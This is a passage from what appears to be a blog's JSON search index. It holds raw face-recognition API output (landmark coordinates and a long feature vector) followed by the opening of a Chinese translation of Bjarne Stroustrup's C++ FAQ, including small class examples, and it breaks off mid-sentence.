15009141,0.021165471524000168,0.029862718656659126,0.03851776197552681,-0.026146583259105682,-0.07993306964635849,-0.02479756996035576,0.008002831600606441,0.011984172277152538,0.03768816962838173,-0.0477895550429821,0.011266223154962063,0.02809823304414749,0.030618904158473015,-0.020879842340946198,0.028993437066674232,-0.0018001128919422626,0.012997044250369072,-0.004323545843362808,-0.008326180279254913,-0.04134036600589752,-0.03120156191289425,-0.023178773000836372,-0.0674988254904747,-0.01763121969997883,0.0064896452240645885,0.008761721663177013,-0.013700208626687527,-0.03296845033764839,-0.012304193340241909,0.015330785885453224,0.02032642811536789,-0.017989957705140114,0.004293774254620075,-0.023352347314357758,0.009456126019358635,-0.0071948254480957985,0.13945403695106506,-0.016969306394457817,-0.040809258818626404,-0.04693187400698662,0.009069397114217281,-0.006082240026444197,0.03343887999653816,0.03314174711704254,-0.00827136728912592,0.018897371366620064,0.0047486526891589165,-0.00210666935890913,0.0011172801023349166,-0.026406139135360718,0.03933439031243324,0.08722592145204544,0.004458937793970108,-0.008677673526108265,0.007660198956727982,-0.014019079506397247,-0.035576868802309036,0.030790362507104874,-0.02806951105594635,0.017882859334349632,0.008278154768049717,-0.018943658098578453,0.006846227683126926,-0.04726598411798477,0.05127565190196037,-0.03851175308227539,-0.009692962281405926,0.0046463413164019585,0.04564407840371132,-0.004654536489397287,-0.008952608332037926,-0.048997003585100174,0.024308405816555023,-0.09805585443973541,-0.013927342370152473,0.04780182987451553,0.027211854234337807,0.0663483589887619,-0.016222737729549408,-0.028166040778160095,-0.02288428507745266,-0.02340715005993843,0.028137708082795143,-0.051438380032777786,0.025699660181999207,-0.038209766149520874,-0.049027323722839355,-0.042398665100336075,0.03674691170454025,-0.013070978224277496,-0.043424785137176514,0.010467455722391605,-0.0289996899664402,-0.01794823259115219,0.025126421824097633,0.004812703467905521,0.026770131662487984,-0.03771400824189186,0.03560658544301987,0.021497827023267746],&quot;errno&quot;:0,&quot;request_id&quot;:&quot;88e419b2-6d7c-403f-b2e3-1660fa224c62&quot;&#125;&#123;&quot;face_num&quot;:1,&quot;face_rect&quot;:[131,87,290,388],&quot;face_prob&quot;:[1.0],&quot;pose&quot;:[18.628498077392578,-8.546553611755371,6.121803283691406],&quot;landmark_num&quot;:105,&quot;landmark&quot;:[203.90921020507812,200.23001098632812,309.45062255859375,218.65631103515625,260.23175048828125,187.56857299804688,256.18084716796875,210.1221923828125,220.7862091064453,190.05401611328125,240.36923217773438,186.42405700683594,279.1256408691406,194.14773559570312,297.05645751953125,202.9366455078125,220.33831787109375,207.10421752929688,238.2987823486328,208.1050262451172,274.00946044921875,212.53118896484375,291.620849609375,216.21713256835938,360.25592041015625,223.7985076904297,421.49774169921875,213.7610321044922,391.5797119140625,204.12503051757812,391.2154235839844,221.29208374023438,369.4400634765625,215.39198303222656,380.16351318359375,209.08740234375,403.4003601074219,200.2273712158203,415.2815856933594,202.97317504882812,370.6798095703125,224.365478515625,381.1012268066406,223.80274963378906,401.0498046875,217.8040313720703,411.18768310546875,215.37713623046875,229.74484252929688,242.3505401611328,281.9598388671875,252.3939208984375,235.8517303466797,237.7692108154297,243.1636199951172,235.57656860351562,250.79469299316406,235.33493041992188,258.37054443359375,236.27748107910156,265.86907958984375,237.71218872070312,272.9955749511719,240.43788146972656,278.67138671875,245.51502990722656,234.4609375,247.66046142578125,240.4391632080078,251.49888610839844,247.0696563720703,254.06130981445312,253.96202087402344,255.785888671875,261.0655517578125,256.0698547363281,268.1637878417969,255.66668701171875,275.18548583984375,254.55349731445312,354.34912109375,258.4804382324219,394.4176025390625,248.78823852539062,356.7430419921875,252.51409912109375,360.75067138671875,247.50848388671875,365.6834716796875,243.4093475341797,371.655517578125,241.15150451660156,378.0198059082031,240.43600463867188,384.3763122558594,241.23443603515625,390.0915222167969,244.07086181640625,359.4935607910156,261.04217529296875,365.04833984375,262.5079650878906,370.7741394042969,262.9674987792969,376.4750671386719,262.41790771484375,381.8265380859375,260.39581298828125,386.527587890625,257.0871887207031,390.8385009765625,253.29058837890625,324.97564697265625,256.5946350097656,333.26715087890625,329.6019592285156,329.2874450683594,293.07568359375,322.9298095703125,344.294677734375,282.2880859375,336.0609436035156,354.2922668457031,337.4645080566406,239.21295166015625,370.7165222167969,327.9872131347656,379.0498352050781,247.05612182617188,372.2748107910156,322.6470947265625,380.3701171875,316.82196044921875,372.19573974609375,310.41607666015625,366.81512451171875,324.5108642578125,368.42181396484375,275.01959228515625,370.7666320800781,327.343505859375,373.64849853515625,257.11602783203125,370.507080078125,292.9189453125,370.6178894042969,326.2695617675781,370.87982177734375,326.8760986328125,376.5396728515625,304.1044921875,398.5556640625,268.6083068847656,391.4709777832031,318.451171875,391.78070068359375,252.39942932128906,383.1255798339844,285.8980407714844,397.2698669433594,311.641357421875,395.9100341796875,323.4048156738281,385.5922546386719,309.3697814941406,380.6801452636719,307.589111328125,378.0981140136719,277.8553466796875,378.915283203125,277.10003662109375,377.0374450683594,316.0401306152344,382.2570495605469,315.41925048828125,376.4609375,262.3118896484375,376.27154541015625,261.91851806640625,375.6103210449219,293.611572265625,379.8153076171875,292.3548278808594,377.26617431640625,312.68487548828125,381.60107421875,311.4006652832031,376.54986572265625,319.36029052734375,381.3873291015625,319.095458984375,378.2879638671875,125.97557067871094,212.2298583984375,412.7919616699219,240.69432067871094,294.56341552734375,471.08868408203125,150.15283203125,373.70672607421875,382.4216613769531,361.142333984375,129.2528839111328,293.0157470703125,405.01837158203125,301.0595703125,215.72640991210938,441.1959228515625,346.50909423828125,420.0110778808594],&quot;iris&quot;:[254.0318603515625,244.33462524414062,11.776544570922852,366.7712707519531,250.25103759765625,11.776544570922852],&quot;gender&quot;:[0],&quot;age&quot;:[25],&quot;expression&quot;:[0],&quot;glass&quot;:[0],&quot;dense_fea_len&quot;:1024,&quot;dense_fea&quot;:[-0.019565869122743607,0.02652040682733059,-0.025296641513705254,0.0013257524697110057,0.008678237907588482,0.0305195152759552,0.008465004153549671,-0.010204668156802654,-0.028829535469412804,0.04127579927444458,-0.03198869153857231,-0.05493219569325447,0.03645092993974686,9.515063720755279E-4,0.02821073867380619,0.03465251624584198,0.014170056208968163,0.018213540315628052,0.036748334765434265,-0.013548667542636395,-0.019267434254288673,0.01479480043053627,0.024582676589488983,-0.05292081832885742,0.02482527121901512,0.021547574549913406,-0.0022464583162218332,0.047043945640325546,0.01623036153614521,-0.004867010284215212,-3.7483361666090786E-4,0.008463726378977299,0.01411566324532032,-0.012659380212426186,-0.014888420701026917,1.9251948106102645E-4,-0.013585352338850498,-0.024148132652044296,0.028499891981482506,0.007853453047573566,-0.04516686126589775,0.026046570390462875,-0.013053921051323414,0.01066762674599886,-0.009034504182636738,0.0322597436606884,0.021841498091816902,-0.052442751824855804,0.04978729784488678,-0.021691270172595978,-0.008792974054813385,0.024738071486353874,-0.01489806268364191,-0.028748109936714172,-0.020100614055991173,0.029379351064562798,0.014156545512378216,0.031002260744571686,0.01518911961466074,0.007233195938169956,-0.03765062987804413,0.025897672399878502,-0.0651504173874855,-0.02410200424492359,0.03466656431555748,-0.029409699141979218,-0.03732691705226898,-0.01992214471101761,0.013510639779269695,-0.047079335898160934,0.025161176919937134,0.014117485843598843,0.02213362045586109,0.006637208163738251,0.017072606831789017,-0.03045104257762432,-0.005495634861290455,-3.929677404812537E-5,-0.036332666873931885,-0.01565079391002655,0.02436942607164383,-0.040990911424160004,-0.047258589416742325,-0.047424815595149994,-0.0334024541079998,0.007675712462514639,-0.016720000654459,-0.032920483499765396,-0.06034409999847412,0.01503259688615799,-0.02487960085272789,0.0077096931636333466,-0.03683016821742058,-0.022425202652812004,0.009493153542280197,-0.010177706368267536,-0.0635981634259224,0.02661089599132538,-0.0156524907797575,0.01956692710518837,0.014645323157310486,-0.010375571437180042,-0.019805679097771645,0.014683020301163197,0.013803336769342422,-0.03930310532450676,-0.0013638578820973635,-0.046861130744218826,-0.03787171468138695,-0.020587710663676262,-0.03255417197942734,0.078705795109272,-6.527972873300314E-4,-0.009917784482240677,-0.030237354338169098,-0.023531455546617508,0.016131145879626274,0.020083917304873466,-0.027687029913067818,-0.042260896414518356,0.06277380883693695,-0.02939515747129917,0.03830057382583618,-0.008601420558989048,-0.03364833816885948,-0.029685741290450096,-0.049161914736032486,-0.007496518548578024,-0.04712251201272011,-0.025192834436893463,0.026744462549686432,0.0553058497607708,-0.012511394917964935,0.03144007548689842,-0.006667234469205141,0.00834844820201397,-0.0059495349414646626,-0.016542736440896988,0.04807665944099426,0.026243198662996292,-0.04158074036240578,0.05009065195918083,0.01453778613358736,0.016685545444488525,0.035252489149570465,-0.017629582434892654,-0.030298609286546707,-0.07182624191045761,0.008106568828225136,-0.02584524266421795,-0.061746351420879364,-0.010592027567327023,0.003979993984103203,0.012710608541965485,0.0038761619944125414,0.012078766711056232,0.011401589028537273,-0.012593797408044338,-0.012608841061592102,-0.01323502603918314,0.009587514214217663,0.018524998798966408,0.007596731651574373,0.06681252270936966,-0.05013915151357651,0.07295693457126617,-0.03523214906454086,-0.035682737827301025,-0.018387148156762123,-0.0518253818154335,-0.021895956248044968,0.03330850601196289,0.05089137330651283,0.011064810678362846,0.03059087134897709,0.019475774839520454,-0.01622232422232628,-0.016904011368751526,0.03019464761018753,-0.039247531443834305,-0.004481450188905001,-0.04673612862825394,0.026468781754374504,-0.020347831770777702,-0.03681745007634163,0.00985900778323412,0.022565681487321854,0.013972022570669651,0.0054641240276396275,0.009626735933125019,-0.055112145841121674,-0.020836275070905685,-0.040630098432302475,0.003730934578925371,0.03793352469801903,0.07189374417066574,-0.005522116553038359,0.01430696900933981,0.05381489917635918,-0.03694852069020271,0.003008819418027997,0.01978391222655773,0.01712598092854023,0.006290169432759285,0.05086244270205498,0.0020777464378625154,-0.03905034437775612,0.01634850911796093,-0.017958298325538635,-0.05407799407839775,0.023605994880199432,0.0468127578496933,0.010871264152228832,0.005447959061712027,-0.02331494353711605,0.02528807707130909,0.028213798999786377,-0.022289060056209564,0.048880673944950104,-0.020433131605386734,-0.02176920510828495,-0.01317388005554676,0.029391195625066757,0.025683781132102013,-0.03681807592511177,0.04604785516858101,-0.02743005007505417,0.04135952517390251,0.029652152210474014,-0.038768526166677475,-0.05110153183341026,-0.04759001359343529,0.04036574810743332,0.03150022402405739,0.024236103519797325,-0.024325743317604065,0.036919642239809036,-0.05281908065080643,-0.018324755132198334,-0.027348224073648453,0.04459496587514877,-0.028998183086514473,-0.01329771801829338,0.030575864017009735,-0.020114978775382042,-0.02310255356132984,-0.06953969597816467,2.0780933846253902E-4,-0.03965244069695473,0.03746594488620758,-0.02527247741818428,2.6120757684111595E-4,-0.0018433531513437629,0.008129576221108437,0.05356234312057495,0.013009524904191494,-0.061822064220905304,0.02459772862493992,-0.04014294967055321,0.03285330906510353,0.009086492471396923,0.018615107983350754,0.00647433428093791,-0.009988122619688511,0.049740519374608994,0.003955503925681114,-0.03199645131826401,-0.012576830573379993,0.013144310563802719,-0.01228663232177496,-0.013566006906330585,-0.00828429963439703,0.004016808234155178,0.09092891961336136,-6.549324607476592E-4,-0.02558557689189911,-0.06884092837572098,-9.695181506685913E-4,-0.053455282002687454,-0.009376738220453262,-0.035260602831840515,-0.016300810500979424,-0.08021561056375504,0.009430884383618832,-0.04543987661600113,-0.0024705142714083195,-0.05730624496936798,-0.0196716096252203,-0.04764667525887489,-4.704423772636801E-4,-0.005540925078094006,-0.02839837782084942,-0.04563096538186073,-0.0254057589918375,-0.007531520910561085,0.055337127298116684,0.03921520337462425,0.03371762856841087,0.016526687890291214,0.025256965309381485,-0.028405819088220596,-0.07569451630115509,0.008604200556874275,-8.500913972966373E-4,-0.014106272719800472,-0.009853819385170937,0.01757221668958664,-0.025076311081647873,-0.014789684675633907,-0.031238095834851265,0.01278828363865614,0.005615269299596548,0.03826235234737396,0.04880881309509277,0.01955423504114151,-0.027956614270806313,-0.03885940462350845,-0.012534508481621742,0.04255145415663719,0.044804371893405914,-0.021619172766804695,-0.01421213336288929,-0.020056355744600296,-0.02708028070628643,0.02190909907221794,0.00688602589070797,-0.008955742232501507,-0.024975595995783806,0.04530319571495056,-0.005033159162849188,-0.03444739058613777,0.04793984815478325,0.004964737221598625,0.023403026163578033,0.007042721379548311,-0.040700480341911316,-0.06141165643930435,0.007979277521371841,-0.023922905325889587,-0.004918318707495928,0.01839129813015461,0.0389944426715374,0.013609785586595535,-0.007411249913275242,0.04396456107497215,-0.01943288929760456,-0.006824728101491928,0.05425979197025299,-0.005264225881546736,-0.014665547758340836,-0.004263053648173809,0.015169499441981316,-0.020430326461791992,-0.031193004921078682,0.025791890919208527,-0.03512677922844887,-0.012831372208893299,-0.04768975079059601,-0.02304854802787304,0.0024588583037257195,-0.03827845677733421,-0.06562338769435883,0.028942588716745377,-0.042514003813266754,-0.031193159520626068,-0.04255402833223343,0.05664687603712082,0.016119657084345818,-0.015722570940852165,-0.009873642586171627,-0.04536405950784683,0.05147889256477356,-0.003788416273891926,0.04480615258216858,-0.010936248116195202,0.003533179173246026,-0.012853305786848068,0.005227710120379925,0.025266198441386223,0.040439244359731674,-0.042127352207899094,-0.031913306564092636,0.022286705672740936,0.017463363707065582,0.0012414550874382257,-0.04225427284836769,0.02746277116239071,0.03229574114084244,-0.0030430611222982407,-0.007653215900063515,-0.02098017930984497,0.00670129619538784,-0.019720550626516342,0.0196071770042181,0.0028270611073821783,0.014768840745091438,-0.03796698525547981,0.016720235347747803,0.0017668295186012983,-0.012580408714711666,-0.014311019331216812,0.015156068839132786,0.07392140477895737,0.0018063491443172097,-0.013954157941043377,-0.009695334360003471,0.04940056800842285,0.03025032766163349,0.033327616751194,0.012690950185060501,-0.0538245365023613,0.012601231224834919,0.03988561034202576,0.020639341324567795,0.01051160879433155,-0.009630593471229076,-0.08055701106786728,-0.036430492997169495,-0.025659218430519104,0.019018078222870827,0.054914604872465134,-0.016415894031524658,0.04389834403991699,-0.035631634294986725,0.03789762407541275,0.0020610990468412638,0.020435960963368416,-0.006651830859482288,-0.014920215122401714,-0.027475396171212196,-0.026619376614689827,-0.07656590640544891,-0.0036131851375102997,-0.040190037339925766,-0.002752599772065878,-0.04798342287540436,0.01396635826677084,-0.022175056859850883,0.008131043054163456,-0.02489851787686348,-0.05697529762983322,0.015952082350850105,-0.010902098380029202,-0.026899080723524094,0.04347239062190056,-0.019214043393731117,-0.006123509723693132,-0.02543482556939125,0.06238100305199623,0.00577638391405344,-0.011739594861865044,-0.03684233874082565,0.010133092291653156,-0.009920259937644005,0.03769146278500557,0.0538882352411747,-0.0018801487749442458,-0.012788652442395687,0.016866814345121384,-0.04557843878865242,0.01492937933653593,-0.038526248186826706,0.03884685039520264,0.05304993316531181,-0.03635863587260246,-0.006040419917553663,0.016025332733988762,0.014858311973512173,0.006594682112336159,0.034767404198646545,-0.05745576322078705,6.801229901611805E-4,0.06594040244817734,0.02442966215312481,0.009246902540326118,-0.024938881397247314,-0.009100819937884808,-0.010550767183303833,-0.023051410913467407,-0.05348048359155655,0.03546988591551781,0.004852553829550743,0.0229302067309618,-0.017620377242565155,-0.01163723785430193,-0.036905333399772644,-0.017018750309944153,-0.004439314361661673,0.037742070853710175,0.05094502493739128,0.0022937851026654243,-0.07365942001342773,-0.014864935539662838,0.006508917082101107,-0.023067165166139603,-0.06367125362157822,-0.03891076520085335,-0.024187719449400902,-0.025690928101539612,-0.019099805504083633,0.011233361437916756,0.026437362655997276,-0.03816616162657738,-0.060305044054985046,-0.021739104762673378,0.014329582452774048,0.00745153846219182,0.01923714205622673,0.030139291658997536,-0.015107971616089344,0.02192893624305725,0.017867572605609894,-0.03345159813761711,0.048532698303461075,-0.04256083816289902,0.012320022098720074,0.003835898358374834,0.013754383660852909,0.011049808003008366,-0.00977579690515995,0.006327439099550247,0.09759684652090073,-0.009634733200073242,0.009735729545354843,0.03475852310657501,-0.017042584717273712,0.006444915197789669,0.029172133654356003,-0.04155300557613373,0.02839786186814308,-0.018251053988933563,-0.03314545005559921,-0.05458470433950424,0.03228972479701042,-0.002378081437200308,-0.003465689020231366,-0.03523945435881615,0.04235132038593292,-0.028863757848739624,0.014839496463537216,-0.012989182025194168,0.028868792578577995,0.03934892639517784,-0.02477121353149414,0.0324263870716095,-0.04058729484677315,-0.00877729244530201,-0.01724991574883461,0.018750056624412537,0.003230178263038397,0.03637741133570671,0.051315613090991974,-0.008803882636129856,0.02985924296081066,-0.01764664426445961,0.031984515488147736,0.006091058254241943,0.0057863579131662846,0.01143576018512249,-0.024009333923459053,0.007955512031912804,-0.05887165665626526,-0.0028545439708977938,-0.024048862978816032,0.009873149916529655,-0.015628501772880554,-0.07380187511444092,-0.019756309688091278,-0.005060930736362934,-0.01245366595685482,-0.008081095293164253,-0.0011957327369600534,0.0015826784074306488,0.010924356058239937,0.01966043934226036,-0.03886054456233978,0.017956318333745003,-0.01679409109055996,-0.01254162099212408,-0.023971958085894585,0.05574356019496918,0.017126288264989853,0.011216334067285061,0.042244698852300644,0.02005648799240589,0.040264733135700226,0.03272198513150215,0.008334454149007797,-0.014000206254422665,0.02621542662382126,-0.028785476461052895,-0.008298266679048538,0.035265009850263596,-0.06604240089654922,-0.054889459162950516,-0.02407420426607132,-0.018243174999952316,0.023327287286520004,0.013975678943097591,-0.020299384370446205,-0.07251012325286865,0.020858624950051308,-0.0062731909565627575,-0.025438303127884865,5.191202508285642E-4,0.0025054689031094313,0.017995381727814674,-0.006192240864038467,-0.011942937038838863,-0.010383151471614838,-0.035113945603370667,0.022518819198012352,-0.008996624499559402,0.02606983296573162,7.527820998802781E-4,0.024454964324831963,-0.0365334153175354,0.012231593951582909,0.034559957683086395,-0.017387328669428825,0.02069661393761635,0.005792704410851002,0.001858886331319809,0.03921511024236679,-0.006885612849146128,-0.01611446402966976,-0.021123502403497696,-0.009597811847925186,0.031175773590803146,-0.003349847160279751,0.01312889251857996,-0.04523979499936104,0.051702871918678284,-0.02848164737224579,0.015327978879213333,-0.052687544375658035,0.022266799584031105,-0.01678522489964962,-0.023664476349949837,0.009589951485395432,-0.011551662348210812,-0.02044581063091755,-0.03724430501461029,0.020525243133306503,0.01372605748474598,0.019521664828062057,-0.005096357315778732,-0.0035253367386758327,0.03726230561733246,0.023288631811738014,0.021730614826083183,0.04498527571558952,0.022119471803307533,0.04698268324136734,0.01580033078789711,0.019838206470012665,-0.044364772737026215,0.021730802953243256,-0.027049114927649498,-0.05865656957030296,0.006623429246246815,0.0021491742227226496,-0.05141407623887062,-0.04435764625668526,0.005598702002316713,0.0103635648265481,-0.03516082838177681,0.020858684554696083,-0.001553701120428741,-0.030875565484166145,-0.037201888859272,-0.0023125973530113697,-0.03282659500837326,-0.003910237457603216,-0.025248298421502113,-0.0021405848674476147,-0.037088025361299515,0.04309152439236641,-0.013890351168811321,-0.005736443214118481,-0.03885723650455475,-0.037063922733068466,-0.01979871094226837,0.03550277277827263,0.001134387799538672,0.029124608263373375,-0.017533814534544945,0.03406732529401779,-0.028683457523584366,0.008181183598935604,0.01801932603120804,-0.017518771812319756,0.008367341943085194,-0.04692481458187103,-0.009064574725925922,-0.015514141879975796,-0.08316738158464432,-0.024432986974716187,0.010592823848128319,-0.012309548445045948,0.041262198239564896,-0.014687208458781242,-0.024120831862092018,-0.033532772213220596,0.003668800927698612,0.025179848074913025,0.041504427790641785,0.019441641867160797,0.0209322739392519,-0.00781439058482647,0.05811570584774017,-0.05118130147457123,0.02608858421444893,0.03158450871706009,0.005990557372570038,0.018090685829520226,0.08083001524209976,0.03943118453025818,-0.03415079414844513,-0.05781104043126106,-0.00945993885397911,-0.02199721150100231,0.01133730448782444,-0.0024789657909423113,0.05951007455587387,0.005275815259665251,-0.028291353955864906,0.029365086928009987,0.03887820243835449,0.034725286066532135,0.014790983870625496,-0.012616056948900223,-1.8686247130972333E-5,-0.023896489292383194,-0.006331601180136204,-0.00435605039820075,-0.010190739296376705,0.003302903613075614,-0.07219726592302322,0.016480406746268272,0.03776325657963753,-0.013342609629034996,-0.039251238107681274,-0.03998871520161629,-0.0016504686791449785,0.029223769903182983,0.023125620558857918,0.0018889277707785368,-0.01572226732969284,-0.04796307161450386,0.016706466674804688,0.01000119000673294,0.0059198192320764065,0.008414414711296558,0.008980367332696915,0.03990929201245308,0.045949507504701614,-0.016356509178876877,-0.029623661190271378,-0.019295459613204002,-0.035757072269916534,0.03653063252568245,-0.009276709519326687,0.0028422679752111435,0.021541889756917953,0.0010574940824881196,0.07865062355995178,-0.005187304690480232,-0.02804129384458065,0.037446897476911545,-0.04298872873187065,0.04492132365703583,-0.00199534697458148,0.030226070433855057,0.06550963968038559,-0.010228810831904411,0.058698732405900955,0.02864663675427437,-0.025329696014523506,-0.04204826429486275,-0.02823682129383087,-0.04187684878706932,-0.033141862601041794,0.009752319194376469,0.030058933421969414,0.023311946541070938,0.008180173113942146,-0.09399928897619247,-0.045919064432382584,-0.04714840650558472,-0.04060627147555351,-9.753078338690102E-4,-0.0444047674536705,0.002999179298058152,-0.022458618506789207,-0.0021589715033769608,0.018953142687678337,-0.006542271003127098,0.04141530394554138,-0.0131559818983078,-0.07521522790193558,0.020049363374710083,-0.0034348685294389725,0.0036864259745925665,-0.021736059337854385,0.010572612285614014,0.00498866057023406,0.03551273047924042,-0.010736429132521152,0.02674330398440361,-0.006475439760833979,-0.004266663920134306,-0.031237484887242317,-0.009657835587859154,0.04948018863797188,0.021648909896612167,0.025878863409161568,-0.03518376126885414,-0.0010956601472571492,0.006011827848851681,0.011826086789369583,-1.3050096458755434E-4,0.03156076371669769,0.022082993760704994,0.08703446388244629,0.04179235175251961,0.06358940154314041,-0.02968417853116989,-0.003496970748528838,0.0316743366420269,0.002007226925343275,0.005037379451096058,-0.013503799214959145,-0.02276608720421791,0.0198051780462265,0.014105218462646008,0.02449001744389534,-0.013212719932198524,0.008877704851329327,-0.05457311496138573,-0.026899177581071854,0.02392779104411602,-0.01346517913043499,0.03503961116075516,-0.010939250700175762,-0.003654538420960307,6.11387484241277E-4,-0.019205285236239433,-0.04684864729642868,0.02592599391937256,-0.016297047957777977,-0.02201077528297901,0.027046557515859604,0.05528521165251732,0.022723594680428505,0.01798335090279579,-0.026575149968266487,-0.039279188960790634,0.07566069811582565,0.041370589286088943,0.039173685014247894,0.043904904276132584,-0.014897147193551064,-0.01122906245291233,-0.028850752860307693,-0.02650470659136772,0.030982157215476036,0.0023264053743332624,-0.03422655165195465,0.01944155804812908,-0.023388488218188286,0.002462210599333048,-1.3708540063817054E-4,-0.02976055070757866,0.03324774652719498,-0.03868003562092781,-0.06296172738075256,-0.03687579929828644,0.0706259161233902,0.020474016666412354,-0.025262758135795593,0.047264084219932556,-0.027542347088456154,0.03647620230913162,-0.010259519331157207,0.03222993388772011,-0.030983297154307365,0.018032576888799667,-0.020948486402630806,0.0033420310355722904,0.03480774909257889,0.040815792977809906,-0.03421010076999664,-0.008063972927629948,0.04071373492479324,-0.010648389346897602,-0.003924423363059759,-0.003111528931185603,0.00998598150908947,0.037015754729509354,-0.009199071675539017,0.027794595807790756,-0.007906417362391949,0.014943954534828663,-0.03177524358034134,0.025454819202423096,0.004652619827538729,0.02415081113576889,-0.03583135828375816,-0.0390060618519783,0.008770537562668324,-0.0037622114177793264,-0.009249706752598286,0.04077623784542084,0.047264255583286285,-0.019599707797169685,0.014159486629068851,0.04559126868844032,0.02749400958418846,-0.016096239909529686,0.06834854930639267,-0.005205987952649593,-0.027538590133190155,-0.00660009915009141,0.021165471524000168,0.029862718656659126,0.03851776197552681,-0.026146583259105682,-0.07993306964635849,-0.02479756996035576,0.008002831600606441,0.011984172277152538,0.03768816962838173,-0.0477895550429821,0.011266223154962063,0.02809823304414749,0.030618904158473015,-0.020879842340946198,0.028993437066674232,-0.0018001128919422626,0.012997044250369072,-0.004323545843362808,-0.008326180279254913,-0.04134036600589752,-0.03120156191289425,-0.023178773000836372,-0.0674988254904747,-0.01763121969997883,0.0064896452240645885,0.008761721663177013,-0.013700208626687527,-0.03296845033764839,-0.012304193340241909,0.015330785885453224,0.02032642811536789,-0.017989957705140114,0.004293774254620075,-0.023352347314357758,0.009456126019358635,-0.0071948254480957985,0.13945403695106506,-0.016969306394457817,-0.040809258818626404,-0.04693187400698662,0.009069397114217281,-0.006082240026444197,0.03343887999653816,0.03314174711704254,-0.00827136728912592,0.018897371366620064,0.0047486526891589165,-0.00210666935890913,0.0011172801023349166,-0.026406139135360718,0.03933439031243324,0.08722592145204544,0.004458937793970108,-0.008677673526108265,0.007660198956727982,-0.014019079506397247,-0.035576868802309036,0.030790362507104874,-0.02806951105594635,0.017882859334349632,0.008278154768049717,-0.018943658098578453,0.006846227683126926,-0.04726598411798477,0.05127565190196037,-0.03851175308227539,-0.009692962281405926,0.0046463413164019585,0.04564407840371132,-0.004654536489397287,-0.008952608332037926,-0.048997003585100174,0.024308405816555023,-0.09805585443973541,-0.013927342370152473,0.04780182987451553,0.027211854234337807,0.0663483589887619,-0.016222737729549408,-0.028166040778160095,-0.02288428507745266,-0.02340715005993843,0.028137708082795143,-0.051438380032777786,0.025699660181999207,-0.038209766149520874,-0.049027323722839355,-0.042398665100336075,0.03674691170454025,-0.013070978224277496,-0.043424785137176514,0.010467455722391605,-0.0289996899664402,-0.01794823259115219,0.025126421824097633,0.004812703467905521,0.026770131662487984,-0.03771400824189186,0.03560658544301987,0.021497827023267746],&quot;errno&quot;:0,&quot;request_id&quot;:&quot;88e419b2-6d7c-403f-b2e3-1660fa224c62&quot;&#125;","tags":""},{"title":"Bjarne Stroustrup's FAQ（中文版）","url":"/20240807/bjarne-stroustrup-s-faq-zhong-wen-ban/","text":"转载自 Bjarne Stroustrup’s FAQ（中文版） Bjarne Stroustrup’s FAQ（中文版） 原作：Bjarne Stroustrup 翻译：Antigloss 译者的话：尽管我已非常用心，力求完美，但受水平所限，错误在所难免，还请各路高手不吝斧正。邮箱地址：Antigloss at 163 dot com。本译文是对以前叶丰的译文的补充，之前叶丰翻译过的内容我没有重译，故亦没有出现于本页面，想看的朋友可以自行搜索一下。呃……其实有少量译文使用了叶丰的翻译，那些我会用灰色字表明。 目 录 概述： 类的伟大之处是什么？ 什么是“OOP”？它的伟大之处是什么？ 何谓“泛型编程”？其伟大之处何在？ 为什么 C++ 允许不安全的代码？ 学习 C++： 为了成为真正的 OO 程序员，在学 C++ 之前，我需要先学一门纯 OO 语言吗？ 标准化： 为何 C++ 没有图形用户接口？ 为何 C++ 不支持线程？ C++0x 会是什么样的？ 书籍： 何时会有新的 ARM？ 其它语言： 您怎么看C#？（使用了部分叶丰原来的译文） 您怎么看待 C++/CLI？ 您如何看待 EC++ ？ 为何您如此看重可移植性？ C： C 是 C++ 的子集吗？ 您真的认为 C 和 C++ 可以合并为同一种语言吗？ 您如何看待 C/C++ ？ 为何编译 C++ 版的“Hello World”程序生成的代码比 C 版的多十倍？ 为何您把 C++ 设计得和 C（基本）兼容？ C++ 的历史： C++ 归您所有吗？ “C++”何得此名？ 您是使用何种语言编写出 C++ 的呢？ 其它： 为何 C++ 如此庞大？ 现在还有人使用 C++ 吗？ 为何 C++ 没被用于编写操作系统？ 有什么好的认证是面向 C++ 程序员的吗？ 关于我： 为何不回复我的电子邮件？（使用了部分叶丰原来的译文） “bjarne”是冒名顶替的吗？ 那真是你说的吗？（使用了部分叶丰原来的译文） 类的伟大之处是什么？ 类可以帮助你组织代码和分析程序。你可以大致理解为，类可以让你避免犯错，而如果你犯错了，类使你易于寻找错误。也就是说，类大大提高了代码的可维护性。 类是思想和观念的代码形式。类的对象是思想的具体实例在代码上的体现。没有类，读代码的人只能猜测数据和函数的关系——类能清楚地表明这种关系，并且能被编译器理解。有了类，程序的高层结构就更能反映在代码上，而不单单是在注释中。 一个设计良好的类能为用户提供简洁易用的接口，并将其内部结构隐藏起来，用户根本不必了解其内部结构。如果内部结构不应该被隐藏——例如，因为用户需要随意改变类中的任何数据成员——你可以把这种类认为是“普通的老式数据结构（data structure）”；例如： 1234struct Pair &#123; Pair(const string&amp; n, const string&amp; v) : name(n), value(v) &#123; &#125; string name, value; &#125;; 注意，数据结构也可以使用辅助函数，例如构造函数。 设计类时，思考类有哪些方面在任何时刻对其每个对象都是通用的，这会很有用。这种通用的属性被称之为不变要素（invariant）。例如，vector 的不变要素是，其内部有一个指针，指向一系列元素，这些元素的数目保存于一个整型变量。每个构造函数都有责任去构建类的不变要素，这样成员函数才能依赖这些不变要素。成员函数退出时必须保持不变要素的有效性。这种思维方式对于管理资源的类来说更是特别有益，如管理锁（locks）、sockets 和文件的类。例如，一个处理文件的类的不变要素是，它有一个指针，指向一个打开的文件。该类的构造函数负责打开文件，而其析构函数负责释放构造函数获取的资源。例如，该类的析构函数负责关闭构造函数打开的文件： 123456789class File_handle &#123; public: File_handle(const char* n, const char* rw) &#123; f = fopen(n,rw); if (f==0) throw Open_failure(n); &#125; ~File_handle() &#123; fclose(f); &#125; // destructor // ... private: FILE* f; &#125;; 如果你未曾使用过类，你会觉得这番说明有些地方相当费解并且会低估类的用处。要寻找例子，和所有优秀的教科书一样，TC++PL（C++ 程序设计语言）里有很多例子；例如，漫游标准库。大多数现代 C++ 库都包含类（当然还有其它东西），库使用指南是寻找有用的类的例子的最佳场所之一。 原文地址：http://www.research.att.com/~bs/bs_faq.html#class 什么是面向对象编程？它的伟大之处是什么？ 面向对象（object oriented, OO），面向对象编程（object-oriented programming, OOP），以及面向对象编程语言（object-oriented programming languages, OOPL）的定义多种多样。想了解我对 OO 的详细看法，请阅读 C++ 为什么不仅仅是面向对象的语言。我在那里写道，OOP 这种编程风格起源于 Simula（约 40 年以前！），它依赖于封装（encapsulation）、继承（inheritance）以及多态（polymorphism）。就 C++（及许多其它源于 Simula 的语言）而言，OOP 的意思是利用类层级（class 